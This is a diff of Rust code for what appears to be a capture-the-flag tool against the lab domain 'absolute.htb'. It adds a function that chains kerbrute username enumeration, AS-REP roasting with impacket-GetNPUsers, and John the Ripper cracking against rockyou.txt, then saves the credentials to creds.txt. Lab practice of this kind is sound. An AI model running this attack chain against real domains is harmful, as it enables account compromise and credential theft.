@@ -1,8 +1,21 @@
 use std::process::Command;
 use std::fs::File;
 use std::io::{Write, stdin, Read};
+use colored::*;
 
-pub fn run_kerbrute() {
+pub fn run() {
+    println!("{}", "Validating Usernames...".blue());
+    run_kerbrute();
+    println!("{}", "ASREPRoasting...".blue());
+    run_impacket_getnpusers();
+    println!("{}", "Cracking Hash...".blue());
+    run_john();
+    println!("{}", "Creds.txt Updated".green());
+    modify_creds_file();
+    print!("{}", "Creds.txt Format Fixed".green());
+}
+
+fn run_kerbrute() {
     // Prepare the kerbrute command with the specified arguments
     let output = Command::new("kerbrute")
         .arg("userenum")
@@ -19,7 +32,7 @@ pub fn run_kerbrute() {
     println!("{}", String::from_utf8_lossy(&output.stderr));
 }
 
-pub fn run_impacket_getnpusers() {
+fn run_impacket_getnpusers() {
     // Prepare the impacket-GetNPUsers command with the specified arguments
     let output = Command::new("impacket-GetNPUsers")
         .arg("absolute.htb/")
@@ -45,7 +58,7 @@ pub fn run_impacket_getnpusers() {
     writeln!(&mut hash_file, "{}", hash_line).expect("Unable to write data to file");
 }
 
-pub fn run_john() {
+fn run_john() {
     // Ask the user for the file path to rockyou.txt
     println!("Please enter the file path to rockyou.txt \nInclude /rockyou.txt in your path \nStart path with /:");
 
@@ -90,7 +103,7 @@ pub fn run_john() {
     }
 }
 
-pub fn modify_creds_file() {
+fn modify_creds_file() {
     let input_path = "creds.txt";
     let mut file = File::open(input_path).expect("Unable to open file");
     let mut contents = String::new();
